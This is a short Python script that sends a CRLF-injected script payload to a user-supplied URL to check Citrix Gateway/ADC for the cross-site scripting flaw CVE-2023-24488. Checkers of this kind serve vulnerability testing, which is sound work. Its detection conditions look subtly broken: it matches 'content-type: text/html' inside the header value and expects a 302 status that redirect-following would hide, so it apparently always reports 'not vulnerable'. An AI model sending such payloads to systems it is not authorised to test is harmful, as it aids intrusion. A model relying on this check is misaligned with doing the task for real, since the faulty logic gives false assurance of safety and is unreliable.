import requests

target_url = input("Enter target URL: ")

def check_cve_2023_24488(url):
    path = "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>"
    response = requests.get(url + path)

    if ("<script>alert(document.domain)</script>" in response.text and
        "content-type: text/html" in response.headers.get("Content-Type", "").lower() and
        response.status_code == 302):
        return True
    return False

if check_cve_2023_24488(target_url):
    print("Vulnerable to CVE-2023-24488: Citrix Gateway and Citrix ADC - Cross-Site Scripting")
else:
    print("Not vulnerable to CVE-2023-24488")